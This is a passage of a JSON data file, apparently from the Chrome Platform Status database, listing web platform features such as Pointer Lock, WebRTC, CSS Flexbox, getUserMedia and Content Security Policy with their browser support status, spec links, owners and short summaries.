        "https://developer.mozilla.org/en-US/docs/Web/API/MediaSource"
      ],
      "samples": [
        "http://html5-demos.appspot.com/static/media-source.html"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:18.348560",
      "by": "ericbidelman@google.com"
    },
    "name": "Pointer Lock (Mouse Lock)",
    "comments": "Chrome on Android does not support this API.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/pointerlock/raw-file/default/index.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=633602",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 23
        },
        "owners": [
          "scheib@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 23,
        "flag": false,
        "bug": "http://crbug.com/72754",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/pointerlockmouselock",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Gives access to raw mouse movement, locks the target of mouse events to a single element, eliminates limits of how far mouse movement can go in a single direction, and removes the cursor from view. Obvious use cases are for first person or real time strategy games.",
    "id": 6753200417800192,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Pointer_Lock_API"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:18.080040",
      "by": "ericbidelman@google.com"
    },
    "name": "Track element",
    "comments": "Demo: simpl.info/track",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://whatwg.org/html#the-track-element",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=629350",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 23
        },
        "owners": [
          "scherkus@chromium.org",
          "vcarbune@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 23,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh772556(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://www.w3.org/community/texttracks/2012/08/23/webvtt-support-in-browsers/",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add subtitles, captions, screen reader descriptions, chapters and other types of timed metadata to video and audio. Chrome currently supports the WebVTT format for track data.",
    "id": 6719115557339136,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/track"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-01-04 14:00:23.883650",
      "by": "hta@chromium.org"
    },
    "name": "WebRTC",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://dev.w3.org/2011/webrtc/editor/webrtc.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 23
        },
        "owners": [
          "sergel@chromium.org",
          "juberti@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 23,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 18,
        "desktop": 18
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/webrtcwebrtcv10api",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Real-time communication in the browser.",
    "id": 6612462929444864,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/API/WebRTC"
      ],
      "samples": [
        "https://apprtc.appspot.com/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:32.069750",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS Flexbox",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/csswg/css-flexbox/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "http://www.mozilla.org/en-US/firefox/22.0/releasenotes/",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 21
        },
        "owners": [
          "ojan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 21,
        "flag": false,
        "bug": "http://wkbug.com/62048",
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh673531",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A CSS box model optimized for user interface design. In the flex layout model, the children of a flex container can be laid out in any direction, and can \"flex\" their sizes, either growing to fill unused space or shrinking to avoid overflowing the parent.",
    "id": 4837301406400512,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Flexible_boxes"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:29:00.555960",
      "by": "ericbidelman@google.com"
    },
    "name": "Drag and Drop Directories",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://wiki.whatwg.org/wiki/DragAndDropEntries",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 21
        },
        "owners": [
          "kinuko@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 21,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows dragging and dropping entire folders using HTML5 Drag and Drop. Extends the DataTransferItem with a method to get a FileEntry/DirectoryEntry.",
    "id": 5733953138851840,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-04-25 05:57:29.416610",
      "by": "Patket@microsoft.com"
    },
    "name": "Meta Referrer",
    "comments": "The feature is currently used by Google and Facebook. The feature has landed in WebKit and is always on.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://wiki.whatwg.org/wiki/Meta_referrer",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=704320",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 21
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 21,
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=72674",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Using the referrer metadata attribute, a document can control the behavior of the Referer HTTP header attached to requests that originate from the document.",
    "id": 5126747842412544,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-04-25 05:52:29.255450",
      "by": "Patket@microsoft.com"
    },
    "name": "getUserMedia",
    "comments": "Demo: simpl.info/gum",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/2011/webrtc/editor/getusermedia.html",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 21
        },
        "owners": [
          "tommyw@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 21,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Public skepticism",
          "val": 6
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Local component of WebRTC",
    "id": 6067380039974912,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Navigator/getUserMedia"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:10.354150",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "<datalist> Element",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/html/wg/drafts/html/master/forms.html#the-list-attribute",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/datalist",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 20
        },
        "owners": [
          "keishi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 20,
        "flag": false,
        "android": 33,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=242455",
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/en-us/library/ie/hh772925(v=vs.85).aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Shows a list of pre-defined options to suggest to the user when entering an input element.",
    "id": 6090950820495360,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/datalist"
      ],
      "samples": [
        "http://simpl.info/datalist"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:28:39.306990",
      "by": "ericbidelman@google.com"
    },
    "name": "Blob",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/2006/webapi/FileAPI/#dfn-Blob",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 20
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 20,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows you to construct Blobs directly (var blob = new Blob([\"1234\"], {type: 'text/plain'})). Blob() constructor also can take ArrayBufferView directly rather than constructing a blob with ArrayBuffer.",
    "id": 5328783104016384,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Blob"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-04-25 05:51:26.116320",
      "by": "Patket@microsoft.com"
    },
    "name": "Date/time input types",
    "comments": "Safari and Firefox are shipping this feature only on mobile versions.\r\nNo browser implements <input type=datetime>.\r\n",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.whatwg.org/specs/web-apps/current-work/multipage/states-of-the-type-attribute.html#date-state-(type=date)",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 20
        },
        "owners": [
          "keishi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 20,
        "flag": false,
        "android": 18,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "<input type=date>, <input type=datetime>, <input type=datetime-local>, <input type=month>, <input type=time>, and <input type=week>.\r\n",
    "id": 6640933999214592,
    "resources": {}
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:29:16.531710",
      "by": "ericbidelman@google.com"
    },
    "name": "iframe[seamless] attribute",
    "comments": "http://benvinegar.github.com/seamless-talk/",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://whatwg.org/html#attr-iframe-seamless",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=631218",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 20
        },
        "owners": [
          "mkwst@chromium.org",
          "eseidel@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 20,
        "blink_components": [
          "Blink"
        ],
        "desktop": 20,
        "flag": true,
        "android": 25,
        "bug": "http://crbug.com/269943",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://status.modern.ie/iframeseamlessattribute",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=45950",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The seamless attribute is used to embed and <iframe> in the calling page without scrollbars or borders (e.g. seamlessly)",
    "id": 6630329993396224,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-seamless"
      ],
      "samples": [
        "http://simpl.info/iframe/"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:37.852830",
      "by": "ericbidelman@google.com"
    },
    "name": "iframe[srcdoc] attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://whatwg.org/html#attr-iframe-srcdoc",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 20
        },
        "owners": [
          "abarth@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 20,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/iframesrcdocattribute",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Gives the content of an iframe as a src context to embed (e.g. <iframe seamless srcdoc=\"<b>Hello World</b>\"></iframe>).",
    "id": 5222955109842944,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-srcdoc"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:06.721420",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "CSS Filters",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/filters/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1057180",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 19
        },
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 19,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://dev.modern.ie/platform/status/filters/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Apply (SVG-like) filter effects to arbitrary DOM elements.",
    "id": 5822463824887808,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/filter"
      ],
      "samples": [
        "http://simpl.info/cssfilters/"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:05.180300",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS calc()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/css3-values",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 19
        },
        "owners": [
          "mikelawther@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 19,
        "flag": false,
        "android": 28,
        "bug": "http://www.w3.org/TR/css3-values/#calc",
        "intervention": false
      },
      "opera": {
        "android": 21,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Method of allowing calculated values for length units, i.e. width: calc(100% - 3em)",
    "id": 5765241438732288,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/calc"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-04-25 05:47:59.254490",
      "by": "Patket@microsoft.com"
    },
    "name": "iframe[sandbox] attribute",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://whatwg.org/html#attr-iframe-sandbox",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 19
        },
        "owners": [
          "abarth@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 19,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/iframesrcdocattribute",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Method of running external site pages with reduced privileges (i.e. no JavaScript) in iframes (<iframe sandbox=\"allow-same-origin allow-forms\" src=\"...\"></iframe>)",
    "id": 5715536319086592,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:36.256430",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "GamePad API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dvcs.w3.org/hg/gamepad/raw-file/default/gamepad.html",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=878828",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 18
        },
        "owners": [
          "scottmg@chromium.org",
          "bajones@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 18,
        "flag": false,
        "bug": "http://crbug.com/344556",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://status.modern.ie/gamepadapi",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://developer.apple.com/library/prerelease/content/releasenotes/General/WhatsNewInSafari/Articles/Safari_10_1.html",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Gives JS access to a game controller via USB.",
    "id": 5118776383111168,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Guide/API/Gamepad"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:34.707280",
      "by": "ericbidelman@google.com"
    },
    "name": "Mutation Observers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dom.spec.whatwg.org/#mutation-observers",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/docs/Mozilla/Firefox/Versions/14#DOM",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 18
        },
        "owners": [
          "rafaelw@chromium.org",
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 18,
        "flag": false,
        "android": 18,
        "bug": "http://wkbug.com/68729",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "url": "http://msdn.microsoft.com/library/ie/dn265034",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Provides notifications when DOM nodes are rearranged or modified.",
    "id": 5021194726146048,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver"
      ],
      "samples": [
        "http://simpl.info/mutationobserver/"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:10.960620",
      "by": "ericbidelman@google.com"
    },
    "name": "Touch Events",
    "comments": "Defacto standard for touch input for many years, W3C standard in REC.  Has a number of known issues, see https://docs.google.com/a/chromium.org/document/d/12-HPlSIF7-ISY8TQHtuQ3IqDi-isZVI0Yzv5zwl90VU/edit",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/touch-events/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 18
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 18,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Touchscreen input API, originally introduced by Apple on iOS",
    "id": 6156165603917824,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Touch_events"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2018-05-01 20:06:36.966630",
      "by": "foolip@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Prefixed Fullscreen API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 15
        },
        "owners": [
          "jeremya@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 15,
        "flag": false,
        "intervention": false
      },
      "opera": {
        "android": 12,
        "desktop": 12
      },
      "edge": {
        "view": {
          "url": "http://www.sitepoint.com/internet-explorer-11-review/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Programmatically instruct content on the page to be presented in the browser's fullscreen mode. This entry is for the prefixed variants of the API, webkitRequestFullscreen. The status for other browsers is also for their prefixed variants.",
    "id": 5259513871466496,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Fullscreen_API"
      ],
      "samples": [
        "http://simpl.info/fullscreen/"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:37.645450",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Content Security Policy Level 1",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://www.w3.org/TR/CSP1/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 14
        },
        "owners": [
          "mkwst@chromium.org",
          "abarth@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 14,
        "flag": false,
        "bug": "http://crbug.com/160081",
        "intervention": false
      },
      "opera": {
        "android": 15,
        "desktop": 15
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Allows you to create a whitelist of sources of trusted content, and instructs the browser to only execute or render resources from those sources.",
    "id": 5205088045891584,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:12.021220",
      "by": "ericbidelman@google.com"
    },
    "name": "Quota Management API",
    "comments": "",
    "standards": {
      "status": {
